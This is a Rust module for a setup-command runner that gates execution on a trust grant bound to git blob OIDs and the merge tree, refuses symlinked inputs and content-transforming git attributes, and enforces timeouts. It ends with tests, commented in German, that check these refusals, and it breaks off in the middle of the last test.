//! Setup-command runner: trust gate, timeout, process-tree kill, log.
//!
//! The trust predicate lives in [`crate::readiness`]. Grants are stored in
//! [`crate::store`]. This module is the execution: a shell line in the worker
//! worktree, a log file, and a last-run record bound to the same evidence the
//! grant used. A matching grant is required before any child is spawned.

#![allow(dead_code)]

use std::fs;
use std::io::Read;
use std::path::{Path, PathBuf};
use std::process::{Command, Stdio};
use std::sync::mpsc::{self, Receiver, Sender};
use std::sync::{Arc, Mutex};
use std::thread;
use std::time::{Duration, Instant};

use serde::{Deserialize, Serialize};

use crate::readiness::{normalize_command, trust_status, TrustGrant, TrustStatus};

/// How long a setup command may run before the process tree is killed.
pub const TIMEOUT: Duration = Duration::from_secs(5 * 60);

const POLL_INTERVAL: Duration = Duration::from_millis(50);
const DRAIN_GRACE: Duration = Duration::from_millis(500);
const OUTPUT_CAP: usize = 256 * 1024;

/// Appended to the captured log when the deadline wins.
pub const TIMEOUT_MARKER: &str = "[projecta] setup command timed out";

/// Files hashed into a setup-trust grant when they exist in the repo.
pub const TRUST_INPUTS: &[&str] = &[
    "package.json",
    "package-lock.json",
    "Cargo.toml",
    "Cargo.lock",
    "scripts/lifecycle.sh",
    "scripts/lifecycle.cmd",
];

/// Last execution bound to the evidence tuple the grant used.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct LastRun {
    pub ok: bool,
    pub timed_out: bool,
    pub inputs_hash: String,
    pub base_sha: String,
    pub command_normalized: String,
    pub at: i64,
    pub log_path: String,
}

/// The directory holding last-run records: beside the worktree, never inside
/// it (a file in the worktree would look dirty to merge-preflight). Single
/// source of the convention — the sweeps derive from here, so a layout
/// change can never leave them sweeping the wrong place (review-F4-r19).
fn record_dir(worktree: &Path) -> PathBuf {
    worktree
        .parent()
        .unwrap_or(worktree)
        .join(".projecta-setup")
}

/// Where the last-run record lives: beside the worktree, never inside it
/// (a file in the worktree would look dirty to merge-preflight).
pub fn last_run_path(worktree: &Path, project_id: &str) -> PathBuf {
    record_dir(worktree).join(format!("{project_id}.json"))
}

pub fn read_last_run(path: &Path) -> Option<LastRun> {
    let bytes = fs::read(path).ok()?;
    serde_json::from_slice(&bytes).ok()
}

pub fn write_last_run(path: &Path, run: &LastRun) -> Result<(), String> {
    if let Some(parent) = path.parent() {
        fs::create_dir_all(parent).map_err(|e| format!("setup log dir: {e}"))?;
    }
    let body = serde_json::to_vec_pretty(run).map_err(|e| format!("setup last-run json: {e}"))?;
    fs::write(path, body).map_err(|e| format!("setup last-run write: {e}"))
}

/// Hash declared executable inputs that currently exist in `repo`.
pub fn hash_inputs(repo: &Path) -> String {
    let mut files: Vec<(String, Vec<u8>)> = Vec::new();
    for name in TRUST_INPUTS {
        let path = repo.join(name);
        if let Ok(bytes) = fs::read(&path) {
            files.push(((*name).to_string(), canonical_input_bytes(&bytes)));
        }
    }
    let refs: Vec<(&str, &[u8])> = files
        .iter()
        .map(|(n, b)| (n.as_str(), b.as_slice()))
        .collect();
    crate::readiness::inputs_hash(&refs)
}

pub fn current_grant(repo: &Path, command: &str, base_sha: &str) -> TrustGrant {
    TrustGrant {
        repo_identity: canonical_repo_identity(repo),
        command_normalized: normalize_command(command),
        base_sha: base_sha.to_string(),
        inputs_hash: hash_inputs(repo),
    }
}

fn canonical_input_bytes(bytes: &[u8]) -> Vec<u8> {
    bytes
        .iter()
        .enumerate()
        .filter_map(|(i, b)| {
            if *b == b'\r' && bytes.get(i + 1) == Some(&b'\n') {
                None
            } else {
                Some(*b)
            }
        })
        .collect()
}

/// Declared executable inputs of a candidate tree: `(name, blob OID)` for
/// every [`TRUST_INPUTS`] file the merge tree contains. The grant binds the
/// OIDs themselves (see [`crate::readiness::inputs_oid_token`]), so no file
/// content is read here at all.
///
/// Both git calls are batched over all names (one `ls-tree`, one
/// `check-attr`): readiness polls this per active worker every 15 s via
/// `useAttentionBlockers`. The WHOLE-TREE attribute sweep deliberately does
/// NOT live here: it is an execution/approval check, and an O(tree)-sized
/// pass has no business in a 15 s poll — it runs in `Candidate::prepare`
/// (before the checkout transforms anything) and in `approve_setup_trust`
/// (review-F4-r22, Opus Fund 4).
pub fn candidate_inputs(
    repo: &Path,
    code: &crate::readiness::CodeTuple,
) -> Result<Vec<(String, String)>, String> {
    let exists = crate::proc::command("git")
        .arg("-C")
        .arg(repo)
        .arg("ls-tree")
        .arg(&code.merge_tree_oid)
        .arg("--")
        .args(TRUST_INPUTS)
        .output()
        .map_err(|e| format!("setup input lookup: {e}"))?;
    if !exists.status.success() {
        return Err("cannot inspect setup inputs".into());
    }
    // Strict contract, version-independent: a declared name may resolve to
    // exactly one `<mode> blob <oid>` line for exactly this name. A directory
    // named like a declared input makes older gits list its children — whose
    // first line can read `100644 blob` and slip past a loose first-token
    // check (review-F4-r13, k3 Befund 2; git 2.55 returns the tree entry
    // itself, measured — both shapes are refused below).
    let listing = String::from_utf8_lossy(&exists.stdout);
    let entries = parse_input_listing(&listing)?;

    // Content-transforming attributes (`filter` — Git LFS, clean/smudge;
    // `ident` — $Id$ expansion; `working-tree-encoding`) all mean the
    // checked-out bytes differ from the blob: display and approval would
    // bind the blob while the run reads transformed content. Refuse instead
    // of trusting bytes nobody saw. One batched call over the present names.
    if !entries.is_empty() {
        let attr = crate::proc::command("git")
            .arg("-C")
            .arg(repo)
            .args([
                // The measurement must see exactly what the candidate
                // checkout sees: the tree's own .gitattributes plus
                // info/attributes — never the machine's global/system
                // attribute files (review-F4-r23, k3 Fund 2).
                "-c",
                "core.attributesFile=",
                "check-attr",
                "--source",
                &code.merge_tree_oid,
                "filter",
                "ident",
                "working-tree-encoding",
                // Explicit `eol=` forces a specific line ending even under
                // the candidate's pinned `core.autocrlf=false`/`core.eol=lf`
                // — refuse it like any other byte transformation. (`text`
                // only normalizes to LF, which the blob identity already
                // covers.)
                "eol",
                "--",
            ])
            .args(entries.iter().map(|(name, _, _)| *name))
            .env("GIT_ATTR_NOSYSTEM", "1")
            .output()
            .map_err(|e| format!("setup input attribute lookup: {e}"))?;
        if !attr.status.success() {
            return Err(
                "cannot inspect setup input attributes (check-attr --source needs git >= 2.40)"
                    .into(),
            );
        }
        let names: Vec<&str> = entries.iter().map(|(name, _, _)| *name).collect();
        check_attr_listing(&names, &String::from_utf8_lossy(&attr.stdout))?;
    }
    Ok(entries
        .into_iter()
        .map(|(name, _, oid)| (name.to_string(), oid.to_string()))
        .collect())
}

/// The grant authorises execution of the WHOLE tree, so the smudge check
/// must cover the whole tree, not only the declared inputs: a filter on any
/// other file (say `scripts/* filter=lfs` with an attacker-chosen endpoint)
/// would hand the candidate checkout bytes nobody saw, and `validate` would
/// stay silent because the clean filter restores byte identity
/// (review-F4-r21, Opus Fund 2). Runs BEFORE the checkout in
/// `Candidate::prepare` (so no filter code or network fetch ever fires on an
/// unreviewed tree, review-F4-r22 Opus Fund 1+2) and again in
/// `approve_setup_trust` — deliberately NOT in the readiness poll, which is
/// O(tree) too heavy for a 15 s tick (Opus Fund 4). One NUL-separated
/// batched pass over every path in the tree; the value rules mirror
/// [`check_attr_listing`].
pub(crate) fn refuse_transforming_tree_attrs(repo: &Path, tree_oid: &str) -> Result<(), String> {
    let paths_out = crate::proc::command("git")
        .arg("-C")
        .arg(repo)
        .args(["ls-tree", "-r", "-z", "--name-only", tree_oid])
        .output()
        .map_err(|e| format!("setup tree listing: {e}"))?;
    if !paths_out.status.success() {
        return Err("cannot inspect setup tree attributes".into());
    }
    let paths: Vec<&[u8]> = paths_out
        .stdout
        .split(|&b| b == 0)
        .filter(|f| !f.is_empty())
        .collect();
    if paths.is_empty() {
        return Ok(());
    }
    let mut child = crate::proc::command("git")
        .arg("-C")
        .arg(repo)
        .args([
            // Same measurement discipline as `candidate_inputs`: exactly the
            // attribute sources the candidate checkout sees (review-F4-r23).
            "-c",
            "core.attributesFile=",
            "check-attr",
            "--source",
            tree_oid,
            "-z",
            "--stdin",
            "filter",
            "ident",
            "working-tree-encoding",
            "eol",
        ])
        .env("GIT_ATTR_NOSYSTEM", "1")
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .spawn()
        .map_err(|e| format!("setup tree attribute lookup: {e}"))?;
    // Feed the paths from a thread: the output pipe must not deadlock the
    // write on big trees.
    let mut stdin = child.stdin.take().expect("piped stdin");
    let input = paths_out.stdout.clone();
    let writer = thread::spawn(move || {
        use std::io::Write;
        let _ = stdin.write_all(&input);
    });
    let out = child
        .wait_with_output()
        .map_err(|e| format!("setup tree attribute lookup: {e}"))?;
    let _ = writer.join();
    if !out.status.success() {
        // `check-attr --source` needs git >= 2.40 — name the cause instead of
        // dead-ending on a mystery (review-F4-r21, Opus B2).
        return Err(
            "cannot inspect setup tree attributes (check-attr --source needs git >= 2.40)".into(),
        );
    }
    // `-z --stdin` answers in NUL-separated (path, attr, value) triples.
    // Note (review-F4-r22, Opus B2): an EMPTY value field (`filter=` in
    // .gitattributes) shifts the triple alignment because empty fields are
    // filtered out. That is deliberately fail-closed: every shift ends in
    // the unknown-attribute arm or the completeness count below — never in
    // a silent pass. Do not "clean up" the `_` arm.
    let mut fields = out.stdout.split(|&b| b == 0).filter(|f| !f.is_empty());
    let mut seen = 0usize;
    while let (Some(path), Some(attr), Some(value)) = (fields.next(), fields.next(), fields.next())
    {
        let path = String::from_utf8_lossy(path);
        let attr = String::from_utf8_lossy(attr);
        let value = String::from_utf8_lossy(value);
        let value = value.trim();
        let harmless = match attr.as_ref() {
            "eol" => value == "unspecified" || value == "unset" || value == "lf",
            "filter" | "ident" | "working-tree-encoding" => {
                value == "unspecified" || value == "unset"
            }
            _ => return Err("cannot inspect setup tree attributes".into()),
        };
        if !harmless {
            return Err(format!(
                "the candidate tree carries a content-transforming attribute ({path}: {attr}: {value}); refusing to run bytes nobody reviewed"
            ));
        }
        seen += 1;
    }
    if seen != paths.len() * 4 {
        return Err("cannot inspect setup tree attributes".into());
    }
    Ok(())
}

/// Every present input must account for all four queried attributes. Only
/// checking the values that ARRIVE would read a short or empty exit-0 answer
/// (format change, a file git has nothing to say about) as "no attribute
/// set" — exactly the smudge situation the refusals exist against, but
/// silent (review-F4-r19, Opus Fund 3). Lines are `<name>: <attr>: <value>`.
fn check_attr_listing(names: &[&str], listing: &str) -> Result<(), String> {
    const ATTRS: &[&str] = &["filter", "ident", "working-tree-encoding", "eol"];
    // Coverage per (file, attribute), not a bare count: duplicates for one
    // file must not arithmetically compensate a missing other file
    // (review-F4-r20, Opus Beobachtung B1).
    let mut seen = std::collections::HashSet::new();
    for line in listing.lines() {
        let Some((name, rest)) = line.split_once(':') else {
            return Err("cannot inspect setup input attributes".into());
        };
        let name = name.trim();
        if !names.contains(&name) {
            return Err("cannot inspect setup input attributes".into());
        }
        let Some((attr, value)) = rest.rsplit_once(':') else {
            return Err("cannot inspect setup input attributes".into());
        };
        let attr = attr.trim();
        if !ATTRS.contains(&attr) {
            return Err("cannot inspect setup input attributes".into());
        }
        // `unset` (a `-filter`-style entry) switches the attribute OFF — the
        // safest answer there is, equivalent to unspecified for all four
        // queried attributes (review-F4-r20, Opus Fund 2). For `eol`, `lf`
        // is equally safe: git only ever converts LF→CRLF on checkout, so an
        // LF-pinned file yields exactly the blob bytes (review-F4-r21, Opus
        // Fund 1). `eol=crlf` and anything set on filter/ident/encoding stay
        // refused; `eol=native` would be neutral under the candidate's
        // pinned `core.eol=lf`, but stays refused — fail-closed over a rare
        // idiom (review-F4-r22, Opus B4).
        let value = value.trim();
        let harmless = match attr {
            "eol" => value == "unspecified" || value == "unset" || value == "lf",
            _ => value == "unspecified" || value == "unset",
        };
        if !harmless {
            return Err(format!(
                "a declared setup input carries a content-transforming attribute ({}); refusing to trust",
                line.trim()
            ));
        }
        seen.insert((name, attr));
    }
    if seen.len() != names.len() * ATTRS.len() {
        return Err("cannot inspect setup input attributes".into());
    }
    Ok(())
}

/// Parse the batched `ls-tree` listing into `(name, mode, oid)` per declared
/// input. Any line that matches no declared name EXACTLY is by construction
/// a directory expansion (older gits list children, C-quoted by
/// `core.quotePath` once a byte ≥ 0x80 appears — then even the `name/`
/// prefix check would miss) or an anomaly: refuse, never discard
/// (review-F4-r17, Opus Fund 3).
fn parse_input_listing(listing: &str) -> Result<Vec<(&str, &str, &str)>, String> {
    let mut entries: Vec<(&str, &str, &str)> = Vec::new(); // (name, mode, oid)
    for line in listing.lines() {
        let Some((meta, path)) = line.split_once('\t') else {
            return Err("setup input listing is unreadable; refusing to trust".into());
        };
        let Some(name) = TRUST_INPUTS.iter().find(|name| **name == path) else {
            return Err(format!(
                "setup input listing carries an unexpected entry {path}; refusing to trust"
            ));
        };
        let mut parts = meta.split_whitespace();
        let (Some(mode), Some(kind), Some(oid)) = (parts.next(), parts.next(), parts.next()) else {
            return Err(format!(
                "declared setup input {name} has an unreadable tree entry; refusing to trust"
            ));
        };
        if kind != "blob" {
            return Err(if mode == "040000" {
                format!("declared setup input {name} is a directory; refusing to trust")
            } else {
                format!("declared setup input {name} is not a regular file; refusing to trust")
            });
        }
        match mode {
            "100644" | "100755" => entries.push((name, mode, oid)),
            "120000" => {
                return Err(format!(
                    "declared setup input {name} is a symlink; refusing to trust"
                ));
            }
            _ => {
                return Err(format!(
                    "declared setup input {name} is not a regular file; refusing to trust"
                ));
            }
        }
    }
    Ok(entries)
}

/// Hash committed candidate inputs while keeping the original repo identity.
pub fn grant_for_tree(
    identity: &Path,
    repo: &Path,
    code: &crate::readiness::CodeTuple,
    command: &str,
) -> Result<TrustGrant, String> {
    let files = candidate_inputs(repo, code)?;
    Ok(grant_from_inputs(identity, code, command, &files))
}

/// Grant plus the names of the bound inputs in a single measurement — the
/// review surface must not spawn the `ls-tree`/`check-attr` probes a second
/// time just to display what the grant already measured (review-F4-r14,
/// Sonnet Befund 5: a transient failure in the duplicate pass would break
/// the approval path although the grant itself was computed fine).
pub fn grant_and_inputs_for_tree(
    identity: &Path,
    repo: &Path,
    code: &crate::readiness::CodeTuple,
    command: &str,
) -> Result<(TrustGrant, Vec<String>), String> {
    let files = candidate_inputs(repo, code)?;
    let grant = grant_from_inputs(identity, code, command, &files);
    let names = files.into_iter().map(|(name, _)| name).collect();
    Ok((grant, names))
}

/// One construction site for the candidate grant, so gate, panel and
/// approval can never drift apart.
fn grant_from_inputs(
    identity: &Path,
    code: &crate::readiness::CodeTuple,
    command: &str,
    files: &[(String, String)],
) -> TrustGrant {
    let refs: Vec<(&str, &str)> = files
        .iter()
        .map(|(name, oid)| (name.as_str(), oid.as_str()))
        .collect();
    // The grant authorises the execution of EVERYTHING the command touches
    // in the tree — `npm ci` runs lifecycle scripts, `make deps` reads the
    // Makefile — so the merge tree itself is always bound, never only the
    // declared inputs (review-F4-r15 Sonnet Fund 1 covered the empty case;
    // review-F4-r16 Opus Fund 1 closed the rest). The declared-input list
    // stays in the token for display and for the symlink/attribute refusals.
    // Price, accepted: every new candidate tree needs its own approval.
    let mut inputs_hash = crate::readiness::inputs_oid_token(&refs);
    if !inputs_hash.is_empty() {
        inputs_hash.push('\n');
    }
    inputs_hash.push_str("tree=");
    inputs_hash.push_str(&code.merge_tree_oid);
    TrustGrant {
        repo_identity: canonical_repo_identity(identity),
        command_normalized: normalize_command(command),
        base_sha: code.base_tip_sha.clone(),
        inputs_hash,
    }
}

pub fn candidate_run_path(
    worktree: &Path,
    worker_id: &str,
    code: &crate::readiness::CodeTuple,
    setup_command: Option<&str>,
) -> PathBuf {
    // Bound to the command too: after the owner fixes a failing setup
    // command, the old run's record must not pose as the new command's
    // result on an unchanged tree (review-F4-r12, Sonnet Fund 2).
    last_run_path(
        worktree,
        &format!(
            "{}-{}-{}",
            crate::readiness::acceptance_hash(worker_id),
            crate::readiness::acceptance_hash(setup_command.unwrap_or("")),
            code.merge_tree_oid
        ),
    )
}

/// Canonical identity: the absolute path, so two spellings of the same
/// checkout do not mint two grants.
pub fn canonical_repo_identity(repo: &Path) -> String {
    fs::canonicalize(repo)
        .unwrap_or_else(|_| repo.to_path_buf())
        .to_string_lossy()
        .into_owned()
}

/// Keep one record/log pair per worker: the files are keyed by candidate
/// tree, so every commit would otherwise pile a new pair beside the worktree
/// (review-F4-r17, Opus Fund 1a). Best effort — a file that resists deletion
/// is the next run's problem, never this run's failure.
pub fn prune_candidate_runs(record_path: &Path, worker_prefix: &str) {
    let Some(dir) = record_path.parent() else {
        return;
    };
    let prefix = format!("{worker_prefix}-");
    let keep_record = record_path.to_path_buf();
    let keep_log = record_path.with_extension("log");
    let Ok(entries) = fs::read_dir(dir) else {
        return;
    };
    for entry in entries.flatten() {
        let path = entry.path();
        let name = entry.file_name().to_string_lossy().into_owned();
        if name.starts_with(&prefix) && path != keep_record && path != keep_log {
            let _ = fs::remove_file(path);
        }
    }
}

/// Sweep ALL record/log pairs of a worker: after merge and worktree removal
/// there is no owner left to trigger the per-tree prune, and the shared
/// `.projecta-setup` directory would keep every retired worker's files
/// forever (review-F4-r18, Opus Fund 2). Best effort, like
/// [`prune_candidate_runs`].
pub fn prune_worker_runs(worktree: &Path, worker_id: &str) {
    let dir = record_dir(worktree);
    let prefix = format!("{}-", crate::readiness::acceptance_hash(worker_id));
    let Ok(entries) = fs::read_dir(dir) else {
        return;
    };
    for entry in entries.flatten() {
        if entry.file_name().to_string_lossy().starts_with(&prefix) {
            let _ = fs::remove_file(entry.path());
        }
    }
}

/// Refuse to spawn when the stored grant does not match the current inputs.
pub fn ensure_trusted(
    granted: Option<&TrustGrant>,
    current: &TrustGrant,
) -> Result<(), TrustStatus> {
    match trust_status(granted, current) {
        TrustStatus::Granted => Ok(()),
        other => Err(other),
    }
}

/// Run `command` in `cwd` only when `granted` matches `current`.
///
/// On mismatch nothing is spawned and no log is written. On a start, the
/// combined stdout/stderr land in `log_path`, and a [`LastRun`] is written to
/// `record_path`.
pub fn run_if_trusted(
    command: &str,
    cwd: &Path,
    granted: Option<&TrustGrant>,
    current: &TrustGrant,
    log_path: &Path,
    record_path: &Path,
    timeout: Duration,
) -> Result<LastRun, TrustStatus> {
    ensure_trusted(granted, current)?;
    let (exit_code, timed_out, output) = run_command_with_timeout(command, cwd, timeout);
    if let Some(parent) = log_path.parent() {
        let _ = fs::create_dir_all(parent);
    }
    let _ = fs::write(log_path, &output);
    let run = LastRun {
        ok: exit_code == Some(0) && !timed_out,
        timed_out,
        inputs_hash: current.inputs_hash.clone(),
        base_sha: current.base_sha.clone(),
        command_normalized: current.command_normalized.clone(),
        at: crate::store::now_unix_secs(),
        log_path: log_path.to_string_lossy().into_owned(),
    };
    let _ = write_last_run(record_path, &run);
    Ok(run)
}

fn shell_command(command: &str) -> Command {
    let mut shell = if cfg!(windows) {
        crate::proc::command("cmd")
    } else {
        crate::proc::command("sh")
    };
    shell.arg(if cfg!(windows) { "/C" } else { "-c" });
    #[cfg(windows)]
    {
        use std::os::windows::process::CommandExt;
        shell.raw_arg(command);
    }
    #[cfg(not(windows))]
    shell.arg(command);
    crate::oneshot::detach_process_group(&mut shell);
    shell
}

fn run_command_with_timeout(
    command: &str,
    cwd: &Path,
    timeout: Duration,
) -> (Option<i32>, bool, String) {
    let mut child = match shell_command(command)
        .current_dir(cwd)
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
    {
        Ok(child) => child,
        Err(err) => return (None, false, format!("failed to start `{command}`: {err}")),
    };
    let mut tree = crate::oneshot::ProcessTree::attach(&child);

    let captured = Arc::new(Mutex::new(String::new()));
    let (done, closed) = mpsc::channel();
    if let Some(stdout) = child.stdout.take() {
        drain(stdout, Arc::clone(&captured), done.clone());
    }
    if let Some(stderr) = child.stderr.take() {
        drain(stderr, Arc::clone(&captured), done.clone());
    }
    drop(done);

    let deadline = Instant::now() + timeout;
    let (status, timed_out) = loop {
        match child.try_wait() {
            Ok(Some(status)) => break (Some(status), false),
            Ok(None) => {}
            Err(_) => break (None, false),
        }
        let left = deadline.saturating_duration_since(Instant::now());
        if left.is_zero() {
            break (None, true);
        }
        thread::sleep(left.min(POLL_INTERVAL));
    };

    let exit_code = if timed_out {
        tree.kill(&mut child);
        None
    } else {
        let code = status.and_then(|status| status.code());
        tree.kill(&mut child);
        code
    };

    await_drains(&closed, DRAIN_GRACE);
    let mut output = captured
        .lock()
        .map(|buffer| buffer.clone())
        .unwrap_or_default();
    if timed_out {
        output.push_str(&format!(
            "\n{TIMEOUT_MARKER} after {} s\n",
            timeout.as_secs()
        ));
    }
    (exit_code, timed_out, output)
}

fn await_drains(closed: &Receiver<()>, grace: Duration) {
    let deadline = Instant::now() + grace;
    loop {
        let left = deadline.saturating_duration_since(Instant::now());
        if left.is_zero() {
            return;
        }
        match closed.recv_timeout(left) {
            Ok(()) => continue,
            Err(_) => return,
        }
    }
}

fn drain<R: Read + Send + 'static>(mut pipe: R, sink: Arc<Mutex<String>>, done: Sender<()>) {
    thread::spawn(move || {
        let mut chunk = [0u8; 4096];
        while let Ok(read) = pipe.read(&mut chunk) {
            if read == 0 {
                break;
            }
            let Ok(mut buffer) = sink.lock() else { break };
            buffer.push_str(&String::from_utf8_lossy(&chunk[..read]));
            if buffer.len() > OUTPUT_CAP {
                let mut cut = buffer.len() - OUTPUT_CAP;
                while !buffer.is_char_boundary(cut) {
                    cut += 1;
                }
                *buffer = buffer[cut..].to_string();
            }
        }
        let _ = done.send(());
    });
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::testutil::TempDir;

    /// Review-F4-r3 (Sonnet, blockierend): ein deklarierter Input, der als
    /// Symlink committed ist, darf nicht den Linktext hashen, während die
    /// Laufzeit über den OS-Symlink das (ungeprüfte) Ziel liest. Der Grant
    /// ist zu verweigern, nicht zu raten.
    #[test]
    fn a_symlinked_declared_input_is_refused() {
        let dir = TempDir::new("setup-symlink");
        let repo = crate::testutil::init_repo(&dir.path().join("repo"));
        let git = |args: &[&str]| {
            let output = crate::proc::command("git")
                .arg("-C")
                .arg(&repo)
                .args(args)
                .output()
                .expect("run git");
            assert!(
                output.status.success(),
                "git {args:?}: {}",
                String::from_utf8_lossy(&output.stderr)
            );
            String::from_utf8_lossy(&output.stdout).trim().to_string()
        };
        // A blob whose content is the link target text, committed as the
        // symlink `package-lock.json` — straight into the index, so no OS
        // symlink support is needed.
        let mut hasher = crate::proc::command("git")
            .arg("-C")
            .arg(&repo)
            .args(["hash-object", "-w", "--stdin"])
            .stdin(std::process::Stdio::piped())
            .stdout(std::process::Stdio::piped())
            .spawn()
            .expect("hash-object");
        use std::io::Write;
        hasher
            .stdin
            .as_mut()
            .expect("stdin")
            .write_all(b"scripts/real-lock.json")
            .expect("write link text");
        let blob = String::from_utf8_lossy(&hasher.wait_with_output().expect("hash").stdout)
            .trim()
            .to_string();
        git(&[
            "update-index",
            "--add",
            "--cacheinfo",
            &format!("120000,{blob},package-lock.json"),
        ]);
        git(&["commit", "--no-gpg-sign", "-m", "symlinked input"]);

        let code = crate::readiness::measure_code(&repo, "main", "HEAD").expect("tuple");
        let err = candidate_inputs(&repo, &code)
            .expect_err("a symlinked declared input must be refused, not hashed as link text");
        assert!(
            err.contains("symlink"),
            "the refusal names the cause: {err}"
        );
    }

    /// Review-F4-r5 (Sonnet, blockierend): ein deklarierter Input mit
    /// zugewiesenem `filter`-Attribut (z. B. Git-LFS) wird als Pointer-Blob
    /// gehasht und angezeigt, beim Checkout aber gesmudged — Anzeige und
    /// Ausführung wären verschiedene Bytes. Der Grant ist zu verweigern.
    #[test]
    fn a_filtered_declared_input_is_refused() {
        let dir = TempDir::new("setup-filter");
        let repo = crate::testutil::init_repo(&dir.path().join("repo"));
        let git = |args: &[&str]| {
            let output = crate::proc::command("git")
                .arg("-C")
                .arg(&repo)
                .args(args)
                .output()
                .expect("run git");
            assert!(
                output.status.success(),
                "git {args:?}: {}",
                String::from_utf8_lossy(&output.stderr)
            );
        };
        std::fs::write(repo.join("package-lock.json"), "pointer\n").expect("write");
        std::fs::write(
            repo.join(".gitattributes"),
            "package-lock.json filter=lfs\n",
        )
        .expect("write attributes");
        git(&["add", "package-lock.json", ".gitattributes"]);
        git(&["commit", "--no-gpg-sign", "-m", "filtered input"]);

        let code = crate::readiness::measure_code(&repo, "main", "HEAD").expect("tuple");
        let err =
            candidate_inputs(&repo, &code).expect_err("a filtered declared input must be refused");
        assert!(err.contains("filter"), "the refusal names the cause: {err}");
    }

    /// Review-F4-r6 (Sonnet, blockierend): neben `filter` transformieren auch
    /// `ident` ($Id$-Expansion) und `working-tree-encoding` die Checkout-Bytes
    /// gegenüber dem Blob. Alle drei Attribute werden gemeinsam abgefragt;
    /// jeder gesetzte Wert verweigert den Grant.
    #[test]
    fn an_ident_declared_input_is_refused() {
        let dir = TempDir::new("setup-ident");
        let repo = crate::testutil::init_repo(&dir.path().join("repo"));
        let git = |args: &[&str]| {
            let output = crate::proc::command("git")
                .arg("-C")
                .arg(&repo)
                .args(args)
                .output()
                .expect("run git");
            assert!(
                output.status.success(),
                "git {args:?}: {}",
                String::from_utf8_lossy(&output.stderr)
            );
        };
        std::fs::write(repo.join("package-lock.json"), "$Id$\n").expect("write");
        std::fs::write(repo.join(".gitattributes"), "package-lock.json ident\n")
            .expect("write attributes");
        git(&["add", "package-lock.json", ".gitattributes"]);
        git(&["commit", "--no-gpg-sign", "-m", "ident input"]);

        let code = crate::readiness::measure_code(&repo, "main", "HEAD").expect("tuple");
        let err = candidate_inputs(&repo, &code)
            .expect_err("an ident-marked declared input must be refused");
        assert!(err.contains("ident"), "the refusal names the cause: {err}");
    }

    /// Review-F4-r11 (Sonnet Fund 1): `--source <tree>` tauscht nur die
    /// versionierten `.gitattributes`; `$GIT_DIR/info/attributes` fließt
    /// weiterhin ein (gemessen auf git 2.55). Ein lokal gesetzter Filter muss
    /// die Verweigerung auslösen — dieser Test pinnt das Verhalten.
    #[test]
    fn a_filter_from_info_attributes_is_refused() {
        let dir = TempDir::new("setup-info-attr");
        let repo = crate::testutil::init_repo(&dir.path().join("repo"));
        std::fs::write(repo.join("package-lock.json"), "{}\n").expect("write");
        let git = |args: &[&str]| {
            let output = crate::proc::command("git")
                .arg("-C")
                .arg(&repo)
                .args(args)
                .output()
                .expect("run git");
            assert!(
                output.status.success(),
                "git {args:?}: {}",
                String::from_utf8_lossy(&output.stderr)
            );
        };
        git(&["add", "package-lock.json"]);
        git(&["commit", "--no-gpg-sign", "-m", "lockfile"]);
        std::fs::write(
            repo.join(".git").join("info").join("attributes"),
            "package-lock.json filter=lfs\n",
        )
        .expect("write info/attributes");

        let code = crate::readiness::measure_code(&repo, "main", "HEAD").expect("tuple");
        let err = candidate_inputs(&repo, &code)
            .expect_err("a locally configured filter must be refused as well");
        assert!(err.contains("filter"), "the refusal names the cause: {err}");
    }

    /// Review-F4-r12 (Sonnet Fund 1, Attribut-Seite): ein explizites
    /// `eol=crlf` erzwingt CRLF selbst unter den gepinnten Checkout-Flags —
    /// Blob und Laufzeit-Bytes laufen auseinander. Verweigern.
    #[test]
    fn an_eol_marked_declared_input_is_refused() {
        let dir = TempDir::new("setup-eol");
        let repo = crate::testutil::init_repo(&dir.path().join("repo"));
        let git = |args: &[&str]| {
            let output = crate::proc::command("git")
                .arg("-C")
                .arg(&repo)
                .args(args)
                .output()
                .expect("run git");
            assert!(
                output.status.success(),
                "git {args:?}: {}",
                String::from_utf8_lossy(&output.stderr)
            );
        };
        std::fs::write(repo.join("package-lock.json"), "{}\n").expect("write");
        std::fs::write(repo.join(".gitattributes"), "package-lock.json eol=crlf\n")
            .expect("write attributes");
        git(&["add", "package-lock.json", ".gitattributes"]);
        git(&["commit", "--no-gpg-sign", "-m", "eol input"]);

        let code = crate::readiness::measure_code(&repo, "main", "HEAD").expect("tuple");
        let err = candidate_inputs(&repo, &code)
            .expect_err("an eol-marked declared input must be refused");
        assert!(err.contains("eol"), "the refusal names the cause: {err}");
    }

    /// Review-F4-r13 (k3 Befund 1, blockierend): der Grant band die
    /// deklarierten Inputs über FNV-1a-64 über die Dateibytes — invertierbar
    /// und über angreiferkontrollierten Inhalt kollidierbar (~2^32
    /// Meet-in-the-Middle), während der Worker-Agent den Inhalt kontrolliert.
    /// Der Grant bindet jetzt die Blob-OIDs selbst: der Token ist die
    /// sortierte `name=oid`-Liste, kein Fold über Bytes.
    #[test]
    fn the_grant_binds_the_blob_oids_not_a_fold_of_the_bytes() {
        let dir = TempDir::new("setup-oid-bind");
        let repo = crate::testutil::init_repo(&dir.path().join("repo"));
        let git = |args: &[&str]| {
            let output = crate::proc::command("git")
                .arg("-C")
                .arg(&repo)
                .args(args)
                .output()
                .expect("run git");
            assert!(
                output.status.success(),
                "git {args:?}: {}",
                String::from_utf8_lossy(&output.stderr)
            );
            String::from_utf8_lossy(&output.stdout).trim().to_string()
        };
        std::fs::write(repo.join("package-lock.json"), "{}\n").expect("write");
        git(&["add", "package-lock.json"]);
        git(&["commit", "--no-gpg-sign", "-m", "lockfile"]);

        let code = crate::readiness::measure_code(&repo, "main", "HEAD").expect("tuple");
        let grant = grant_for_tree(&repo, &repo, &code, "npm ci").expect("grant");
        let oid = git(&[
            "rev-parse",
            &format!("{}:package-lock.json", code.merge_tree_oid),
        ]);
        assert_eq!(
            grant.inputs_hash,
            format!("package-lock.json={oid}\ntree={}", code.merge_tree_oid),
            "the grant token IS the blob oid list plus the tree binding — no weak fold over attacker bytes"
        );

        // Changed lockfile content under an unchanged command: new blob oid,
        // the stored grant mismatches and trust is re-asked.
        std::fs::write(repo.join("package-lock.json"), "{\"changed\":true}\n").expect("write");
        git(&["add", "package-lock.json"]);
        git(&["commit", "--no-gpg-sign", "-m", "regenerated"]);
        let changed = crate::readiness::measure_code(&repo, "main", "HEAD").expect("tuple");
